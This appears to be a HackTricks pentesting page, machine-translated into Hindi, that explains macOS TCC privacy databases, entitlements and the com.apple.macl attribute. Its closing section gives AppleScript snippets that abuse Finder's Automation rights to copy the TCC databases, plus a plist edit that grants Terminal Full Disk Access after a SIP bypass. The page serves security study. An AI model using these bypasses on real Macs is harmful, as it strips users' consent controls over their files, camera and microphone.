# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**

</details>

## **मूलभूत जानकारी**

**TCC (Transparency, Consent, and Control)** मैकओएस में एक तंत्र है जो **निश्चित सुविधाओं तक एप्लिकेशन का पहुंच सीमित और नियंत्रित करने** के लिए होता है, आमतौर पर एक गोपनीयता के दृष्टिकोण से। इसमें स्थान सेवाएं, संपर्क, फ़ोटो, माइक्रोफ़ोन, कैमरा, पहुंचिता, पूर्ण डिस्क पहुंच और बहुत कुछ शामिल हो सकता है।

उपयोगकर्ता के दृष्टिकोण से, वे TCC को कार्रवाई में देखते हैं **जब एक ऐप्लिकेशन TCC द्वारा संरक्षित सुविधा तक पहुंच चाहता है**। जब ऐसा होता है, तो **उपयोगकर्ता को प्रश्न पूछा जाता है** कि क्या वह पहुंच को अनुमति देना चाहते हैं या नहीं।

यह भी संभव है कि उपयोगकर्ता द्वारा **निर्दिष्ट इंटेंट्स** के माध्यम से ऐप्स को फ़ाइलों की पहुंच दी जाए, उदाहरण के लिए जब उपयोगकर्ता एक फ़ाइल को एक प्रोग्राम में **ड्रैग एंड ड्रॉप करता है** (स्वाभाविक रूप से प्रोग्राम को इसकी पहुंच होनी चाहिए)।

![TCC प्रॉम्प्ट का एक उदाहरण](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** को **डेमन** `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` में संगठित किया जाता है और `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` में कॉन्फ़िगर किया जाता है (मशीन सेवा `com.apple.tccd.system` को पंजीकृत करना)।

यहां आप देख सकते हैं कि तंत्रिका सिस्टम के रूप में और उपयोगकर्ता के रूप में चल रही है:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
अनुमतियाँ **मूल एप्लिकेशन से विरासत में आती हैं** और अनुमतियाँ **बंडल आईडी** और **डेवलपर आईडी** के आधार पर **ट्रैक की जाती हैं**।

### TCC डेटाबेस

चयन फिर **TCC सिस्टम-व्यापी डेटाबेस में संग्रहीत** किया जाता है, जो **`/Library/Application Support/com.apple.TCC/TCC.db`** में होता है या प्रति-उपयोगकर्ता वरीयताओं के लिए **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** में होता है। डेटाबेसों को **SIP**(सिस्टम अखंडता संरक्षण) के साथ **संपादित करने से सुरक्षित रखा गया है**, लेकिन आप उन्हें पढ़ सकते हैं।

{% hint style="danger" %}
**iOS** में TCC डेटाबेस **`/private/var/mobile/Library/TCC/TCC.db`** में होता है।
{% endhint %}

**`/var/db/locationd/clients.plist`** में एक **तीसरा** TCC डेटाबेस होता है जो **स्थान सेवाओं तक पहुंच देने वाले क्लाइंट** को दर्शाता है।

इसके अलावा, **पूर्ण डिस्क एक्सेस** वाले प्रक्रिया **उपयोगकर्ता मोड** डेटाबेस को **संपादित कर सकती है**। अब एक ऐप को डेटाबेस को **पढ़ने** (और उपयोगकर्ताओं को संशोधित करने के लिए) भी **FDA** या **`kTCCServiceEndpointSecurityClient`** की आवश्यकता होती है।

{% hint style="info" %}
**नोटिफिकेशन सेंटर UI** सिस्टम TCC डेटाबेस में **परिवर्तन कर सकता है**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

हालांकि, उपयोगकर्ता नियमों को **`tccutil`** कमांड लाइन उपयोगिता के साथ **हटा सकते या प्रश्न कर सकते हैं**।
{% endhint %}

{% tabs %}
{% tab title="उपयोगकर्ता डीबी" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="सिस्टम डीबी" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
दोनों डेटाबेस की जांच करके आप देख सकते हैं कि किसी ऐप ने कौन सी अनुमतियाँ दी हैं, कौन सी अनुमतियाँ मना की गई हैं, या कौन सी अनुमतियाँ नहीं हैं (इसके लिए यह पूछेगा)।
{% endhint %}

* **`auth_value`** में अलग-अलग मान हो सकते हैं: denied(0), unknown(1), allowed(2), या limited(3)।
* **`auth_reason`** निम्नलिखित मान ले सकता है: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* टेबल के **अन्य फ़ील्ड्स** के बारे में अधिक जानकारी के लिए [**इस ब्लॉग पोस्ट की जांच करें**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)।

{% hint style="info" %}
कुछ TCC अनुमतियाँ हैं: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... उन सभी की परिभाषा बताने वाली कोई सार्वजनिक सूची नहीं है, लेकिन आप इस [**ज्ञात सूची की जांच कर सकते हैं**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)।

**पूर्ण डिस्क एक्सेस** का नाम है **`kTCCServiceSystemPolicyAllFiles`** और **`kTCCServiceAppleEvents`** ऐप को अन्य ऐप्स को इवेंट भेजने की अनुमति देता है जो सामान्य रूप से **कार्यों को स्वचालित करने** के लिए उपयोग किए जाते हैं।

**kTCCServiceEndpointSecurityClient** एक TCC अनुमति है जो उच्च अधिकार भी प्रदान करती है, उनमें से एक विकल्प है उपयोगकर्ता डेटाबेस में लिखने की।

इसके अलावा, **`kTCCServiceSystemPolicySysAdminFiles`** एक ऐसी अनुमति है जो एक उपयोगकर्ता के **`NFSHomeDirectory`** विशेषता को बदलने की अनुमति देती है जो उसके होम फ़ोल्डर को बदल देती है और इसलिए TCC को **दौरा करने की अनुमति देती है**।
{% endhint %}

आप यह भी जांच सकते हैं कि किसी ऐप को `System Preferences --> Security & Privacy --> Privacy --> Files and Folders` में पहले से दी गई अनुमतियाँ हैं।

{% hint style="success" %}
ध्यान दें कि यदि डेटाबेसों में से कोई भी एक उपयोगकर्ता के होम में है, तो **उपयोगकर्ता SIP के कारण इन डेटाबेसों को सीधे संशोधित नहीं कर सकते** (यदि आप रूट हों तो भी)। एक नई नियम को कॉन्फ़िगर करने या संशोधित करने का एकमात्र तरीका सिस्टम प्राथमिकता पैनल या प्रॉम्प्ट के माध्यम से है जहां ऐप उपयोगकर्ता से पूछता है।

हालांकि, ध्यान दें कि उपयोगकर्ता **`tccutil`** का उपयोग करके नियमों को **हटा सकते हैं या क्वेरी कर सकते हैं**।
{% endhint %}

#### रीसेट
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC हस्ताक्षर जांच

TCC **डेटाबेस** में एप्लिकेशन के **बंडल आईडी** को संग्रहीत किया जाता है, लेकिन यह भी **हस्ताक्षर** के बारे में **जानकारी** संग्रहीत करता है ताकि अनुमति का उपयोग करने के लिए अप्लिकेशन सही हो।

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select hex(csreq) from access where client="ru.keepcoder.Telegram";
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
इसलिए, एक ही नाम और बंडल ID का उपयोग करने वाले अन्य एप्लिकेशन अन्य ऐप्स को दिए गए अनुमतियों तक पहुंच नहीं पा सकेंगे।
{% endhint %}

### अधिकार

ऐप्स को केवल कुछ संसाधनों के लिए अनुरोध करने और उन्हें पहुंच दिए जाने के लिए ही नहीं होता है, उन्हें संबंधित अधिकार भी होने चाहिए।\
उदाहरण के लिए, **Telegram** के पास `com.apple.security.device.camera` अधिकार है जिसका उपयोग **कैमरे तक पहुंच के लिए** करने के लिए किया जाता है। इसके बिना किसी ऐप को कैमरे तक पहुंच नहीं होगी (और उपयोगकर्ता से अनुमतियों के लिए पूछा भी नहीं जाएगा)।

हालांकि, ऐप्स को `~/Desktop`, `~/Downloads` और `~/Documents` जैसे कुछ उपयोगकर्ता फ़ोल्डरों तक पहुंच करने के लिए किसी विशेष अधिकार की आवश्यकता नहीं होती है। सिस्टम स्वचालित रूप से पहुंच को संभालेगा और उपयोगकर्ता को आवश्यकतानुसार प्रश्नित करेगा।

एप्पल के ऐप्स प्रश्निति नहीं उत्पन्न करेंगे। उनमें उनकी अधिकार सूची में पूर्व-अनुमति होती है, जिसका अर्थ है कि वे कभी भी पॉपअप उत्पन्न नहीं करेंगे, और वे किसी भी TCC डेटाबेस में दिखाई नहीं देंगे। उदाहरण के लिए:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
यह यह सुनिश्चित करेगा कि कैलेंडर उपयोगकर्ता से यादें, कैलेंडर और पता पुस्तिका तक पहुंच करने के लिए पूछता नहीं है।

{% hint style="success" %}
इंटाइटलमेंट्स के बारे में कुछ आधिकारिक दस्तावेज़ीकरण के अलावा, इंटाइटलमेंट्स के बारे में अनौपचारिक **रोचक जानकारी भी मिल सकती है** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) में
{% endhint %}

### संवेदनशील असुरक्षित स्थान

* $HOME (खुद)
* $HOME/.ssh, $HOME/.aws, आदि
* /tmp

### उपयोगकर्ता की इच्छा / com.apple.macl

पहले ही उल्लेख किया गया है कि यह संभव है कि **एक ऐप को एक फ़ाइल तक पहुंच देने के लिए उसे ड्रैग एंड ड्रॉप करके अनुमति दी जाए**। इस पहुंच को किसी भी TCC डेटाबेस में निर्दिष्ट नहीं किया जाएगा लेकिन यह फ़ाइल के **विस्तारित गुणांक के रूप में** रखा जाएगा। इस गुणांक में अनुमति दी गई ऐप का UUID संग्रहीत होगा:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
यह अद्भुत है कि **Sandbox** द्वारा **`com.apple.macl`** विशेषता का प्रबंधन किया जाता है, न कि tccd द्वारा।

इसके अलावा ध्यान दें कि यदि आप अपने कंप्यूटर में किसी ऐप के UUID की अनुमति देने वाले एक फ़ाइल को दूसरे कंप्यूटर में स्थानांतरित करते हैं, क्योंकि एक ही ऐप के लिए अलग-अलग UID होंगे, इससे उस ऐप को पहुंच नहीं मिलेगी।
{% endhint %}

विस्तारित विशेषता `com.apple.macl` को अन्य विस्तारित विशेषताओं की तरह **हटाया नहीं जा सकता** क्योंकि इसे **SIP द्वारा संरक्षित** किया गया है। हालांकि, जैसा कि [**इस पोस्ट में समझाया गया है**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), इसे **फ़ाइल को ज़िप करके अक्षम किया जा सकता है**, फिर उसे **हटाया जा सकता है** और फिर से **अनज़िप किया जा सकता है**।

## TCC Privesc & Bypasses

### Automation से FDA तक का Privesc

**Finder** एक ऐप्लिकेशन है जिसमें **हमेशा FDA होता है** (यदि यह UI में नहीं दिखाई देता है तो भी), इसलिए यदि आपके पास इसके ऊपर **Automation** अधिकार हैं, तो आप इसके अधिकारों का दुरुपयोग करके **कुछ कार्रवाई करवा सकते हैं**।

{% tabs %}
{% tab title="उपयोगकर्ताओं का TCC.db चुराएं" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% tab title="सिस्टम TCC.db चुराएँ" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}
{% endtabs %}

आप इसका दुरुपयोग करके **अपना खुद का उपयोगकर्ता TCC डेटाबेस लिख सकते हैं**।

यहां फाइंडर पर ऑटोमेशन अधिकार प्राप्त करने के लिए TCC प्रॉम्प्ट है:

<figure><img src="../../../../.gitbook/assets/image.png" alt="" width="244"><figcaption></figcaption></figure>

### उपयोगकर्ता TCC DB से FDA तक प्राइवेसी

उपयोगकर्ता TCC डेटाबेस पर **लेखन अनुमतियां** प्राप्त करके आप खुद को **`FDA`** अनुमतियां नहीं दे सकते हैं, केवल जो सिस्टम डेटाबेस में रहता है वह दे सकता है।

लेकिन आप खुद को **`फाइंडर के लिए ऑटोमेशन अधिकार`** दे सकते हैं, और पिछले तकनीक का दुरुपयोग करके FDA तक उन्नति कर सकते हैं।

### **FDA से TCC अनुमतियों तक प्राइवेसी**

मुझे लगता है कि यह एक वास्तविक प्राइवेसी नहीं है, लेकिन यदि आपको यह उपयोगी लगता है तो यहां है: यदि आपके पास FDA के साथ एक प्रोग्राम का नियंत्रण है तो आप **उपयोगकर्ताओं के TCC डेटाबेस को संशोधित करके खुद को किसी भी एक्सेस दे सकते हैं**। यह आपके FDA अनुमतियों को खो सकने की स्थिरता तकनीक के रूप में उपयोगी हो सकता है।

### **SIP बाइपास से TCC बाइपास तक**

सिस्टम **TCC डेटाबेस** SIP द्वारा संरक्षित है, इसलिए केवल उन प्रक्रियाओं को ही संशोधित करने की अनुमति होगी जिनमें **निर्दिष्ट अधिकार होंगे**। इसलिए, यदि हमलावार कोई **SIP बाइपास** एक **फ़ाइल** पर पाता है (SIP द्वारा प्रतिबंधित फ़ाइल को संशोधित करने की अनुमति हो), तो वह TCC डेटाबेस की सुरक्षा को हटा सकता है, और खुद को सभी TCC अनुमतियां दे सकता है।

हालांकि, इस **SIP बाइपास का उपयोग करके TCC को बाइपास करने** के लिए एक और विकल्प है, `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` फ़ाइल एक ऐसी अनुमति की सूची है जिसमें TCC छूट आवश्यकता वाले अनुप्रयोगों की सूची होती है। इसलिए, यदि हमलावार SIP संरक्षण को इस फ़ाइल से हटा सकता है और अपने **खुद के अनुप्रयोग** को जोड़ सकता है, तो अनुप्रयोग TCC को बाइपास कर सकेगा।
उदाहरण के लिए टर्मिनल जोड़ने के लिए:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:

अनुमति दी गई अनुप्रयोग सूची.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC बाईपास

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## संदर्भ

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित** हो? या क्या आप **PEASS के नवीनतम संस्करण का उपयोग करना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** **अनुसरण** करें।**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs को** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में सबमिट करके**।

</details>
